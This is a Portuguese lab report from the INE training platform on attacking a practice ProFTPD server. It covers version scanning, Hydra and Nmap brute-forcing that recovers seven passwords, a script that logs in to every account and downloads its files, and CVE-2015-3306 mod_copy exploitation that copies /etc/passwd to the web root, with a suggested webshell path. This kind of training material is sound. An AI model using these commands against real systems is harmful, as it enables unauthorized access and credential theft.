# 🧪 Lab Report — ProFTPD Recon: Hydra + Nmap ftp-brute + Extração de Flags

> **Plataforma:** INE
> **Tema central:** Identificação de versão FTP → Brute force com Hydra → Brute force com Nmap NSE → Login em múltiplas contas → Extração de arquivos
> **Alvo:** `demo.ine.local`

---

## 🎯 Objetivo

Realizar reconhecimento completo de um servidor ProFTPD, descobrir credenciais de múltiplos usuários usando duas ferramentas diferentes e extrair flags de cada conta.

---

## 📋 Sumário

| # | Ação | Ferramenta | Resultado |
|---|------|-----------|-----------|
| 1 | Identificar versão FTP | `nmap -sV` | ProFTPD 1.3.5a |
| 2 | Brute force multi-usuário | `hydra` | 7 pares usuário:senha |
| 3 | Brute force com NSE (usuário único) | `nmap --script ftp-brute` | sysadmin:654321 |
| 4 | Login e extração de flags | `ftp` | 7 flags coletadas |

---

## 🔬 Execução Passo a Passo

### Step 1 — Identificar Versão do Servidor FTP

```bash
nmap -sV demo.ine.local
```

**Resultado:**
```
21/tcp  open  ftp  ProFTPD 1.3.5a
```

**Por que a versão importa — ProFTPD 1.3.5:**

| CVE | Vulnerabilidade | Condição |
|-----|----------------|---------|
| CVE-2015-3306 | `mod_copy` — cópia de arquivos sem autenticação | mod_copy habilitado |
| CVE-2010-4221 | Buffer overflow pré-autenticação | Versão < 1.3.3g |

`ProFTPD 1.3.5a` é afetado pelo **CVE-2015-3306**. O módulo `mod_copy` permite que qualquer usuário não autenticado copie arquivos no servidor usando os comandos `SITE CPFR` e `SITE CPTO`.

```bash
# Verificar/explorar mod_copy (se habilitado)
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS demo.ine.local
```

---

### Step 2 — Brute Force Multi-Usuário com Hydra

```bash
hydra \
  -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
  -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
  demo.ine.local \
  -t 4 \
  ftp
```

**Por que `-t 4` em vez do padrão 16:**
Servidores FTP geralmente têm limite de conexões simultâneas. ProFTPD por padrão limita conexões por IP. Com 16 threads, o Hydra pode receber erros de conexão recusada. Usar `-t 4` reduz paralelismo e aumenta a estabilidade do brute force.

**Resultado — 7 credenciais encontradas:**
```
[21][ftp] host: demo.ine.local  login: sysadmin      password: 654321
[21][ftp] host: demo.ine.local  login: rooty         password: qwerty
[21][ftp] host: demo.ine.local  login: demo          password: butterfly
[21][ftp] host: demo.ine.local  login: auditor       password: chocolate
[21][ftp] host: demo.ine.local  login: anon          password: purple
[21][ftp] host: demo.ine.local  login: administrator password: tweety
[21][ftp] host: demo.ine.local  login: diag          password: tigger
```

---

### Step 3 — Brute Force com Nmap NSE (Abordagem Alternativa)

```bash
# Criar wordlist com usuário único
echo "sysadmin" > /root/users

# Rodar script ftp-brute só contra esse usuário
nmap --script ftp-brute \
  --script-args userdb=/root/users \
  -p 21 demo.ine.local
```

**Por que usar Nmap NSE em vez de só o Hydra:**

| | Hydra | Nmap ftp-brute |
|-|-------|----------------|
| Velocidade | Alta | Mais lento |
| Wordlists | Customizáveis | Wordlist interna ou customizável via args |
| Integração | Standalone | Integrado ao scan (resultado vai junto ao output do Nmap) |
| Melhor para | Brute force intensivo | Verificação rápida dentro do workflow de scan |

**Output:**
```
| ftp-brute:
|   Accounts:
|     sysadmin:654321 - Valid credentials
```

**Uso do `--script-args userdb=`:**
Sem isso, o script usa uma wordlist interna pequena. Com `userdb`, você fornece uma lista customizada — essencial quando já tem um usuário confirmado e quer só encontrar a senha.

---

### Step 4 — Login e Extração de Flags

Cada usuário tem uma flag em um arquivo dentro do seu diretório FTP.

#### Sysadmin
```bash
ftp demo.ine.local
# Name: sysadmin
# Password: 654321

ftp> ls
ftp> get secret.txt
ftp> exit

cat secret.txt
# Flag1: 260ca9dd8a4577fc00b7bd5810298076
```

#### Rodar para todos os usuários (padrão de comandos):
```bash
# Rooty
ftp demo.ine.local
# rooty / qwerty
ftp> ls && get <arquivo> && exit
# Flag2: e529a9cea4a728eb9c5828b13b22844c

# Demo
# demo / butterfly
# Flag3: d6a6bc0db10694a2d90e3a69648f3a03

# Auditor
# auditor / chocolate
# Flag4: 098f6bcd4621d373cade4e832627b4f6

# Anon
# anon / purple
# Flag5: 1bc29b36f623ba82aaf6724fd3b16718

# Administrator
# administrator / tweety
# Flag6: 21232f297a57a5a743894a0e4a801fc3

# Diag
# diag / tigger
# Flag7: 12a032ce9179c32a6c7ab397b9d871fa
```

**Script de automação para múltiplas contas:**
```bash
#!/bin/bash
# Arquivo creds.txt: usuario:senha (um por linha)
# Format: usuario senha arquivo_a_baixar

declare -A CREDS=(
  [sysadmin]="654321"
  [rooty]="qwerty"
  [demo]="butterfly"
  [auditor]="chocolate"
  [anon]="purple"
  [administrator]="tweety"
  [diag]="tigger"
)

for user in "${!CREDS[@]}"; do
  pass="${CREDS[$user]}"
  echo "=== Conectando como $user ==="
  ftp -n demo.ine.local <<EOF
user $user $pass
ls
mget *
bye
EOF
  echo ""
done
```

---

## 📊 Resultado Final

| Usuário | Senha | Flag |
|---------|-------|------|
| sysadmin | 654321 | `260ca9dd8a4577fc00b7bd5810298076` |
| rooty | qwerty | `e529a9cea4a728eb9c5828b13b22844c` |
| demo | butterfly | `d6a6bc0db10694a2d90e3a69648f3a03` |
| auditor | chocolate | `098f6bcd4621d373cade4e832627b4f6` |
| anon | purple | `1bc29b36f623ba82aaf6724fd3b16718` |
| administrator | tweety | `21232f297a57a5a743894a0e4a801fc3` |
| diag | tigger | `12a032ce9179c32a6c7ab397b9d871fa` |

---

## 🧠 Conceitos Consolidados

### Hydra vs Nmap NSE para Brute Force FTP

```
Hydra:
✅ Mais rápido com threads
✅ Wordlists grandes
✅ Multi-protocolo
✅ Melhor para varredura em massa
❌ Pode sobrecarregar servidores com limite de conexões

Nmap ftp-brute:
✅ Integrado ao workflow de scan
✅ Output vai junto com o scan do Nmap
✅ Mais gentil com o servidor
❌ Mais lento
❌ Menos flexível para wordlists grandes
```

**Quando usar cada um:**
- Recon rápido integrado → `nmap --script ftp-brute`
- Usuário específico com grande wordlist de senhas → `hydra -l usuario -P grande_lista.txt`
- Múltiplos usuários × múltiplas senhas → `hydra -L users.txt -P pass.txt -t 4`

### ProFTPD 1.3.5a — CVE-2015-3306 (mod_copy)

Se o módulo `mod_copy` estiver habilitado, é possível copiar arquivos sem autenticação:

```bash
# Teste manual com netcat
nc -nv IP 21
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt

# Acessar via HTTP
curl http://IP/passwd.txt

# Via Metasploit
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS IP
set SITEPATH /var/www/html
run
```

### FTP não-interativo (para automação)

```bash
# Sintaxe com heredoc — útil em scripts
ftp -n IP <<EOF
user sysadmin 654321
ls
get secret.txt
bye
EOF

# Com curl (alternativa ao cliente ftp)
curl ftp://sysadmin:654321@IP/secret.txt -o secret.txt

# Download de todos os arquivos de um diretório
wget -m ftp://sysadmin:654321@IP/
```

---

## 🔁 Próximos Passos Lógicos

```
7 usuários com senha obtidos
        ↓
Testar mesmas credenciais em outros serviços
(SSH, SMB, HTTP admin) → reutilização de senha
        ↓
Verificar CVE-2015-3306 (mod_copy)
        ↓
Se mod_copy ativo → copiar webshell para /var/www/html
        ↓
RCE via HTTP
```

---

## 📌 Relacionados

- [[FTP — File Transfer Protocol]]
- [[FTP Enumeration com Metasploit]]
- [[FTP Porta Nao-Padrao e Hydra Brute Force]]
- [[Hydra]]
- [[Nmap — NSE]]

#lab #recon/ativo #protocolo/ftp #ferramenta/hydra #brute-force
